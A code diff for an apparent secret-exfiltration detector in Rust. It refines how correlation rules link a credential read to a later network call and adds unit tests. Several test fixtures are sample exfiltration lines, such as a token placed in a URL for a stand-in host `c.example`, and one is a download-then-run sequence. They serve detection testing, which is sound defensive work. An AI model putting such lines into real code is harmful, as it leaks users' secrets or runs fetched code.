@@ -14,15 +14,28 @@
 //! `window_lines` apart with the source first (or on the same line), the
 //! link is established when
 //!
-//! 1. the source line *binds* a name and that name appears as a whole word
-//!    in the sink's argument window (the sink line and the few lines after
-//!    it, where a multi-line call keeps its arguments), or
+//! 1. the source line *binds* a name and the sink's argument window (the
+//!    sink line and the few lines after it, where a multi-line call keeps its
+//!    arguments) uses that name, or
 //! 2. source and sink are the same line (`requests.post(u, json={"k":
 //!    os.getenv("KEY")})`);
 //!
 //! and no `sink_excludes` substring appears in that window — `headers=` and
 //! `Authorization` are where a key legitimately goes, and excluding them is
 //! what keeps every ordinary API client from lighting up.
+//!
+//! What counts as a use is the rule's `name_uses`. `"value"` (every built-in
+//! chain) reads the name with [`uses_word`]: a keyword argument's name, an
+//! assignment target or an object key that only repeats the bound name is not
+//! a use of it. With `url = os.environ["DATABASE_URL"]` bound above
+//! `requests.get(url=base + "/ping")`, the call sends `base + "/ping"`, and
+//! `json={"token": "x"}` beside a bound `token` sends `"x"`; `data=token`,
+//! `json={"k": token}`, `f"...{token}"`, `token=token` and `{ token }` do send
+//! it. `"word"` reads it with [`contains_word`], any whole-word occurrence,
+//! which is how the chains without a statement window linked before the
+//! field existed, and how a rule that leaves `name_uses` unset still links
+//! outside the statement mode. Two f-string forms that do send the value read
+//! as a name, and do not link by value: `f"{token=}"` and `f"{token:>40}"`.
 //!
 //! A rule may also set `sink_window_before`, which makes the window the
 //! sink's *statement* (see [`statement_scope`]). That is for sinks matched on
@@ -42,10 +55,10 @@
 //! os.environ["TOKEN"]},` above or below `verify=False,` — as long as its
 //! line starts in the sink line's bracket group or one nested inside or
 //! around it (see [`group_paths`]); a sibling literal of the same statement
-//! (`openai: {...}` beside `db: { ssl: {...} }`) is another thing. Names are
-//! read with [`uses_word`] in this mode: a keyword argument's name or an
-//! object key that repeats a bound name (`headers={"Accept": ...}`,
-//! `token=role_token`) is not a use of it.
+//! (`openai: {...}` beside `db: { ssl: {...} }`) is another thing. A whole
+//! call is where keyword names and keys live (`headers={"Accept": ...}`,
+//! `token=role_token`), so a rule in this mode that leaves `name_uses` unset
+//! reads names as values.
 //!
 //! A rule may set `max_line_length`: a source or sink on a longer line is not
 //! linked, because on a minified bundle one line holds a whole program.
@@ -88,7 +101,7 @@ use std::sync::OnceLock;
 
 use regex::Regex;
 
-use crate::corpus::schema::CorrelationRule;
+use crate::corpus::schema::{CorrelationRule, NameUses};
 
 use super::{Finding, Phase, Severity};
 
@@ -323,8 +336,9 @@ fn is_ident_byte(b: u8) -> bool {
 /// Does `ident` appear in `text` as a *value*: a whole word that is not only
 /// a name something else is given to?
 ///
-/// A rule with `sink_window_before` links through this instead of
-/// [`contains_word`]. Keyword-argument names and object keys are the names a
+/// A rule with `name_uses: "value"` (or, leaving it unset, one in the
+/// statement mode) links through this instead of [`contains_word`].
+/// Keyword-argument names and object keys are the names a
 /// call's parameters have, whatever is passed: `headers={"Accept": "json"}`
 /// does not use a `headers` dict bound from a token two functions up,
 /// `hvac.Client(token=role_token)` does not use a `token` variable, and
@@ -421,6 +435,7 @@ pub fn apply(rules: &[CorrelationRule], findings: &[Finding], lines: &[&str]) ->
             // the lines that set up or use the object it binds; every other
             // rule reads the sink line and the lines after it.
             let statement_mode = !file_only && rule.sink_window_before > 0;
+            let by_value = links_by_value(rule, statement_mode);
             let scope = if statement_mode {
                 statement_scope(lines, sink_line, rule.sink_window_before)
             } else {
@@ -469,10 +484,10 @@ pub fn apply(rules: &[CorrelationRule], findings: &[Finding], lines: &[&str]) ->
                         } else {
                             source_bindings(l)
                         };
-                        // The statement mode reads a whole call, whose
-                        // keyword names and keys are not values it sends.
+                        // A call's keyword names and keys are not values
+                        // it sends (`name_uses`).
                         bound.iter().any(|ident| {
-                            if statement_mode {
+                            if by_value {
                                 uses_word(link_text, ident)
                             } else {
                                 contains_word(link_text, ident)
@@ -518,6 +533,19 @@ pub fn apply(rules: &[CorrelationRule], findings: &[Finding], lines: &[&str]) ->
         }
     }
     out
+}
+
+/// Does `rule` link a bound name only where the window uses it as a value
+/// ([`uses_word`]) rather than on any whole-word occurrence
+/// ([`contains_word`])? The rule's `name_uses` decides; unset, the rule links
+/// the way it did before the field existed: by value in the statement mode,
+/// by word otherwise.
+fn links_by_value(rule: &CorrelationRule, statement_mode: bool) -> bool {
+    match rule.name_uses {
+        Some(NameUses::Value) => true,
+        Some(NameUses::Word) => false,
+        None => statement_mode,
+    }
 }
 
 /// The sink line plus the lines that can still carry its arguments: the
@@ -908,6 +936,9 @@ mod tests {
             },
             window_lines: 20,
             sink_window_before: 0,
+            // Unset: the default, which outside the statement mode is the
+            // word reading the legacy chains used before `name_uses` existed.
+            name_uses: None,
             max_line_length: 0,
             sink_excludes: vec!["headers".to_string(), "Authorization".to_string()],
             remediation: None,
@@ -1592,5 +1623,201 @@ mod tests {
         ];
         let findings = vec![f("CRED-012", 2), f("KWARG-001", 3)];
         assert!(apply(&[above_rule()], &findings, &got).is_empty());
+    }
+
+    /// `rule()` as the pack states EXFIL-CHAIN-001: names read as values.
+    fn value_rule() -> CorrelationRule {
+        CorrelationRule {
+            name_uses: Some(NameUses::Value),
+            ..rule()
+        }
+    }
+
+    /// `rule()` with the reading the legacy chains used before `name_uses`.
+    fn word_rule() -> CorrelationRule {
+        CorrelationRule {
+            name_uses: Some(NameUses::Word),
+            ..rule()
+        }
+    }
+
+    /// Does `rule` link a source that binds `name` on line 1 to a sink call
+    /// that starts on line 2?
+    fn links(rule: &CorrelationRule, name: &str, sink: &str) -> bool {
+        let src = format!("{name} = read_secret()\n{sink}\n");
+        let lines: Vec<&str> = src.lines().collect();
+        let findings = vec![f("CRED-012", 1), f("NET-001", 2)];
+        !apply(std::slice::from_ref(rule), &findings, &lines).is_empty()
+    }
+
+    /// The reported false positive: `url` is bound from a credential read and
+    /// handed to `create_engine`; the later `requests.get(url=...)` names its
+    /// parameter `url` and sends `base + "/ping"`. Read as words, it was a
+    /// Critical EXFIL-CHAIN-001.
+    #[test]
+    fn a_keyword_name_is_not_the_bound_value() {
+        let src = "import os\nimport requests\n\nurl = read_secret()\nengine = create_engine(url)\n\n\ndef ping(base):\n    return requests.get(url=base + \"/ping\")\n";
+        let lines: Vec<&str> = src.lines().collect();
+        let findings = vec![f("CRED-001", 4), f("NET-001", 9)];
+        assert!(apply(&[value_rule()], &findings, &lines).is_empty());
+        let chains = apply(&[word_rule()], &findings, &lines);
+        assert_eq!(chains.len(), 1, "{chains:#?}");
+        assert!(chains[0]
+            .snippet
+            .contains("CRED-001 (@L4) reaches NET-001 (@L9)"));
+        // Unset, outside the statement mode, is the word reading.
+        assert_eq!(apply(&[rule()], &findings, &lines).len(), 1);
+    }
+
+    #[test]
+    fn names_and_keys_that_repeat_the_bound_name_do_not_link() {
+        for (name, sink) in [
+            ("url", "requests.get(url=base + \"/ping\")"),
+            ("url", "requests.get(url = base)"),
+            ("token", "requests.post(u, json={\"token\": \"x\"})"),
+            ("token", "requests.post(u, json={'token': 'x'})"),
+            ("token", "axios.post(u, { token: \"anonymous\" })"),
+            (
+                "url",
+                "requests.get(\n    url=status_base,\n    timeout=5,\n)",
+            ),
+            (
+                "token",
+                "requests.post(\n    u,\n    json={\n        \"token\": \"x\",\n    },\n)",
+            ),
+        ] {
+            assert!(!links(&value_rule(), name, sink), "{sink}");
+            assert!(links(&word_rule(), name, sink), "word reading: {sink}");
+        }
+    }
+
+    #[test]
+    fn the_value_side_still_links() {
+        for (name, sink) in [
+            ("api_key", "requests.post(u, json={\"k\": api_key})"),
+            ("token", "requests.post(u, data=token)"),
+            ("token", "requests.get(f\"https://c.example/?t={token}\")"),
+            ("token", "requests.post(u, token)"),
+            ("token", "requests.post(u, token=token)"),
+            ("token", "requests.get(u, params={\"token\": token})"),
+            ("token", "fetch(u, { method: \"POST\", body: token })"),
+            ("token", "axios.post(u, { token })"),
+            ("token", "axios.post(u, { token, source })"),
+            (
+                "secret",
+                "requests.post(\n    u,\n    data={\"s\": secret},\n)",
+            ),
+        ] {
+            assert!(links(&value_rule(), name, sink), "{sink}");
+            assert!(links(&word_rule(), name, sink), "word reading: {sink}");
+        }
+        // An auth header uses the name. What keeps EXFIL-CHAIN-001 quiet on
+        // it is the rule's `sink_excludes`, under either reading.
+        let header = "requests.post(u, headers={\"Authorization\": token})";
+        let no_excludes = CorrelationRule {
+            sink_excludes: vec![],
+            ..value_rule()
+        };
+        assert!(links(&no_excludes, "token", header));
+        assert!(!links(&value_rule(), "token", header));
+        assert!(!links(&word_rule(), "token", header));
+    }
+
+    /// The cost: two f-string forms send the value but read as a name, and
+    /// do not link by value. Python's self-documenting `f"{token=}"` looks
+    /// like an assignment, and a format spec, `f"{token:>40}"`, like an object
+    /// key after `{`. (`f"{token}"`, `f"{token!r}"` and JavaScript's
+    /// `${token}` are uses.)
+    #[test]
+    fn f_string_forms_that_read_as_a_name() {
+        for sink in [
+            "requests.get(f\"https://c.example/?{token=}\")",
+            "requests.get(f\"https://c.example/?t={token:>40}\")",
+        ] {
+            assert!(!links(&value_rule(), "token", sink), "{sink}");
+            assert!(links(&word_rule(), "token", sink), "{sink}");
+        }
+        for sink in [
+            "requests.get(f\"https://c.example/?t={token!r}\")",
+            "fetch(`https://c.example/?t=${token}`)",
+        ] {
+            assert!(links(&value_rule(), "token", sink), "{sink}");
+        }
+    }
+
+    /// A launch links through the file the download wrote, named on the launch
+    /// line. An environment key or keyword on that line that shares the
+    /// path's name (`env={"PATH": ...}` after `open(PATH, 'wb')`) is not the
+    /// program it runs.
+    #[test]
+    fn a_launch_line_key_does_not_link_a_written_path() {
+        let by_value = CorrelationRule {
+            name_uses: Some(NameUses::Value),
+            ..launch_rule()
+        };
+        let by_word = CorrelationRule {
+            name_uses: Some(NameUses::Word),
+            ..launch_rule()
+        };
+        let findings = vec![f("NET-002", 1), f("CODE-RUNFILE-001", 3)];
+        let with_launch = |launch: &str| {
+            format!(
+                "with urlopen(req) as response, open(PATH, 'wb') as out_file:\n    out_file.write(response.read())\n{launch}\n"
+            )
+        };
+        for launch in [
+            "run([interp, build_script], env={\"PATH\": \"/usr/bin\"})",
+            "run([interp, build_script], env=dict(base_env, PATH=bin_dir))",
+        ] {
+            let src = with_launch(launch);
+            let lines: Vec<&str> = src.lines().collect();
+            assert!(
+                apply(std::slice::from_ref(&by_value), &findings, &lines).is_empty(),
+                "{launch}"
+            );
+            assert_eq!(
+                apply(std::slice::from_ref(&by_word), &findings, &lines).len(),
+                1,
+                "word reading: {launch}"
+            );
+        }
+        for launch in [
+            "run([interp, PATH])",
+            "run([interp, PATH], env={\"PATH\": \"/usr/bin\"})",
+        ] {
+            let src = with_launch(launch);
+            let lines: Vec<&str> = src.lines().collect();
+            assert_eq!(
+                apply(std::slice::from_ref(&by_value), &findings, &lines).len(),
+                1,
+                "{launch}"
+            );
+        }
+    }
+
+    #[test]
+    fn name_uses_unset_keeps_each_mode_as_it_was() {
+        assert!(!links_by_value(&rule(), false));
+        assert!(links_by_value(&rule(), true));
+        for statement_mode in [false, true] {
+            assert!(links_by_value(&value_rule(), statement_mode));
+            assert!(!links_by_value(&word_rule(), statement_mode));
+        }
+        // In the statement mode an explicit `"value"` is what an unset field
+        // already did (TLS-CHAIN-001 states it and behaves as before); an
+        // explicit `"word"` links the keyword name again.
+        let src = "headers = {\"A\": read_secret()}\nr1 = get(api, headers=headers)\nr2 = get(status, headers={\"Accept\": \"json\"}, flag=off)\n";
+        let lines: Vec<&str> = src.lines().collect();
+        let findings = vec![f("CRED-012", 1), f("KWARG-001", 3)];
+        let value = CorrelationRule {
+            name_uses: Some(NameUses::Value),
+            ..above_rule()
+        };
+        assert!(apply(&[value], &findings, &lines).is_empty());
+        let word = CorrelationRule {
+            name_uses: Some(NameUses::Word),
+            ..above_rule()
+        };
+        assert_eq!(apply(&[word], &findings, &lines).len(), 1);
     }
 }
